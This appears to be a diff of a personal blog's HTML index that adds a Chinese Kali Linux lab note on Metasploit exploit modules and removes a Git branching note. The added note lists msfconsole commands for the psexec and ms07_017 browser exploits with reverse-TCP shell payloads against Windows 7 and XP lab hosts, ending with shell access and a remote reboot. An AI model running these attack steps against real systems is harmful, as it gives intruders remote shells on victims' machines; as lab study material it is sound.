@@ -240,6 +240,299 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Exploit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%80)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Exploit/" itemprop="url">Kali Linux笔记(一百零一)：MSF模块--Exploit</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T16:36:47+08:00">
+                2020-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  509 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Exploit模块"><a href="#1-Exploit模块" class="headerlink" title="1. Exploit模块"></a>1. Exploit模块</h4><ul>
+<li>Active exploit<ul>
+<li>攻击者主动发payload给被攻击方</li>
+<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
+<li><strong><code>🔺命令：set RHOST 192.168.1.100</code></strong> </li>
+<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LHOST 192.168.1.1</code></strong> </li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set SMBUSER user1</code></strong> </li>
+<li><strong><code>🔺命令：set SMBPASS pass1</code></strong> </li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Passive Exploits <ul>
+<li>被攻击者主动访问攻击者，攻击者返回payload给被攻击者</li>
+<li><strong><code>🔺命令：use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</code></strong> <ul>
+<li><strong><code>🔺命令：set URIPATH /</code></strong> </li>
+<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：et LHOST 192.168.1.1</code></strong> </li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-实验–Active-exploit"><a href="#2-实验–Active-exploit" class="headerlink" title="2. 实验–Active exploit"></a>2. 实验–Active exploit</h4><ul>
+<li>Kali主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window 7主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>关闭防火墙，查看ip地址</li>
+</ul>
+</li>
+<li>Kali主机<ul>
+<li><strong><code>🔺命令：service postgresql start</code></strong></li>
+<li><strong><code>🔺命令：msfconsole</code></strong><ul>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
+<li><strong><code>🔺命令：set RHOST Window 7的IP</code></strong> </li>
+<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：set SMBUSER Window 7的一个用户账号</code></strong> </li>
+<li><strong><code>🔺命令：set SMBPASS Window 7的一个用户密码</code></strong> </li>
+<li><strong><code>🔺命令：exploit -j</code></strong></li>
+<li><strong><code>🔺命令：sessions -l</code></strong></li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：shell</code></strong></li>
+<li><strong><code>🔺命令：ifconfig</code></strong></li>
+<li><strong><code>🔺命令：shutdown -r</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>▲ 2020.2.26 该模块在win7上无法exploit</li>
+</ul>
+<h4 id="3-实验–Passive-Exploits"><a href="#3-实验–Passive-Exploits" class="headerlink" title="3. 实验–Passive Exploits"></a>3. 实验–Passive Exploits</h4><ul>
+<li>Kali主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window 7主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>打开防火墙，查看ip地址</li>
+</ul>
+</li>
+<li>Kali主机<ul>
+<li><strong><code>🔺命令：service postgresql start</code></strong></li>
+<li>msfconsole 重复Active exploit，看是否能进行连接</li>
+</ul>
+</li>
+<li>Window XP SP2主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>打开防火墙，查看ip地址</li>
+</ul>
+</li>
+<li>Kali主机<ul>
+<li><strong><code>🔺命令：msfconsole</code></strong><ul>
+<li><strong><code>🔺命令：use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</code></strong><ul>
+<li><strong><code>🔺命令：set SRVHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：set URIPATH /</code></strong> </li>
+<li><strong><code>🔺命令：set PAYLOAD windows/shell/reverse_tcp</code></strong> <ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong> </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window XP SP2主机<ul>
+<li>浏览器访问<a href="http://Kali的IP/" target="_blank" rel="noopener">http://Kali的IP/</a></li>
+</ul>
+</li>
+<li>Kali之际<ul>
+<li>看是否返回有关session、shell`**</li>
+<li><strong><code>🔺命令：sessions -l</code></strong></li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：shell</code></strong></li>
+<li><strong><code>🔺命令：shutdown -r</code></strong></li>
+</ul>
+</li>
+<li>2020.2.26 暂无下载Window XP SP2，但在Window XP SP3上无法exploit</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE)%EF%BC%9AMeterpreter%20Shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2224,235 +2517,6 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/Git%E7%AC%94%E8%AE%B0-3%EF%BC%9AGit%E7%9A%84%E5%88%86%E6%94%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/20/Git%E7%AC%94%E8%AE%B0-3%EF%BC%9AGit%E7%9A%84%E5%88%86%E6%94%AF/" itemprop="url">Git笔记-3：Git的分支</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:24:49+08:00">
-                2020-02-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Git/" itemprop="url" rel="index">
-                    <span itemprop="name">Git</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  280 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Git的分支"><a href="#1-Git的分支" class="headerlink" title="1. Git的分支"></a>1. Git的分支</h4><ul>
-<li>版本发布、功能增加、错误修改</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ace2SXmY4j2w431Za6bUmolska07iWjqYRn76YL3WvZR9aVpdTy5qQ-HN9rX9omN46NTFfzu5cGHb7lh_R8BoYvgFqqi3cMoEjywIoHsUNGu2J38Uw_VSq8ff6nX7xOYnfo&file_name=/3-Git%E5%88%86%E6%94%AF-1.PNG" alt="3-Git分支-1"></p>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=a764bq-2RuR41FYAOFiemUOJvtelDBs1NrzXKTcayUV2Zqr50lpWlVmwcfThfKMbS8TQx6L_cIRUvmeEEA0FO26n1787BIK83e5LQXodBzq3Bb7Q4oxaSAuwfOcQ9kCRx20&file_name=/3-Git%E5%88%86%E6%94%AF-2.PNG" alt="3-Git分支-2"></p>
-<ul>
-<li>分支发布合并</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ae25caEmzRExQeYzws_s8ffQZlGnW5Q0U0DIPupQKMCZXwhW0VFDZJc6Za0K4uSatBIby5YEXQzaI9Nn7v4CNkOd9rJSdzZm3nQL4Aea4GC8YfqRsB46QPgNAfdcx7s025s&file_name=/3-Git%E5%88%86%E6%94%AF-3.PNG" alt="3-Git分支-3"></p>
-<h4 id="2-Git分支操作"><a href="#2-Git分支操作" class="headerlink" title="2. Git分支操作"></a>2. Git分支操作</h4><ul>
-<li>创建分支：<strong><code>🔺命令：git branch 分支名</code></strong><ul>
-<li>基于某个分支创建的分支，会复制其内容</li>
-</ul>
-</li>
-<li>查看分支：<strong><code>🔺命令：git branch</code></strong></li>
-<li>跳转分支：<strong><code>🔺命令：git checkout 分支名</code></strong>   </li>
-<li>创建分支并跳转：<strong><code>🔺命令：git checkout -b 分支名</code></strong></li>
-<li>删除分支：<strong><code>🔺命令：git branch -d 分支名</code></strong><ul>
-<li>▲ 无合并到master的分支无法删除，或者使用-D参数`**</li>
-</ul>
-</li>
-<li>合并分支：<strong><code>🔺命令：git merge 分支名</code></strong></li>
-</ul>
-<h4 id="3-Git-tutorial-Repository"><a href="#3-Git-tutorial-Repository" class="headerlink" title="3. Git-tutorial Repository"></a>3. Git-tutorial Repository</h4><ul>
-<li>cd git-tutorial</li>
-<li>git branch feature1</li>
-<li>git branch</li>
-<li>git checkout feature1</li>
-<li>touch a.txt</li>
-<li>vim a.txt</li>
-<li>this is a.txt → wq</li>
-<li>git add a.txt</li>
-<li>git commit -m “a.txt”</li>
-<li>git branch feature2</li>
-<li>git checkout feature2</li>
-<li>git checkout -b feature3</li>
-<li>git branch</li>
-<li>git branch -d feature2</li>
-<li>touch b.txt</li>
-<li>vim b.txt</li>
-<li>this is b.txt → wq</li>
-<li>git add b.txt</li>
-<li>git commit -m “b.txt”</li>
-<li>git checkout master</li>
-<li>git branch -d feature3</li>
-<li>git merge feature3</li>
-<li>git push</li>
-<li>查看Github仓库是否有a.txt和b.txt，但无其他分支</li>
-<li>git branch feature1</li>
-<li>git push origin feature1</li>
-<li>查看Github仓库是否有feature1分支</li>
-<li>git push origin :feature1</li>
-<li>查看Github仓库是否无feature1分支</li>
-<li>git push origin feature1:f1</li>
-<li>查看Github仓库的feature1是否更改为f1</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2507,7 +2571,7 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">127</span>
+                  <span class="site-state-item-count">128</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2614,7 +2678,7 @@ reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">113.7k</span>
+    <span title="Site words total count">114.7k</span>
   
 </div>
 
